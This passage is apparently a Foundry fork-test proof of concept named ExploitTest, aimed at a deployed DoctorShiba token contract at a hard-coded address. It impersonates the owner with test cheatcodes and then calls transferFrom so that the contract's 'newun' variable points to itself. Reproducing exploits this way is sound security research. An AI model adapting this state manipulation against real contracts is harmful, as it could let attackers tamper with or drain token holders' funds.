    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE;
    IDoctorShiba doctorShiba = IDoctorShiba(TARGET);

    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, let's check if newun is already set
        (, bytes memory newunData) = TARGET.staticcall(abi.encodeWithSignature("newun()"));
        address currentNewun = abi.decode(newunData, (address));

        if (currentNewun == TARGET) {
            console.log("newun already set to TARGET");
            return;
        }

        require(currentNewun == address(0), "newun already set to different address");

        // We need DS tokens to transfer. Let's check the owner's balance
        (, bytes memory ownerData) = TARGET.staticcall(abi.encodeWithSignature("owner()"));
        address tokenOwner = abi.decode(ownerData, (address));
        console.log("Token owner:", tokenOwner);

        // Impersonate the owner to get tokens
        vm.startPrank(tokenOwner);

        // First, transfer some tokens to attacker so we have balance
        doctorShiba.transfer(attacker, 1000 * 10**9);

        // Approve attacker to spend tokens
        doctorShiba.approve(attacker, 1000 * 10**9);

        vm.stopPrank();

        // Now call transferFrom as attacker
        // sender = attacker (we're sending our own tokens)
        // recipient = TARGET (contract address)
        // This should set newun = TARGET
        vm.prank(attacker);
        doctorShiba.transferFrom(attacker, TARGET, 1 * 10**9);

        // Verify newun is now TARGET
        (, newunData) = TARGET.staticcall(abi.encodeWithSignature("newun()"));
        currentNewun = abi.decode(newunData, (address));
        require(currentNewun == TARGET, "Failed to set newun to TARGET");

        console.log("Successfully set newun to TARGET");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

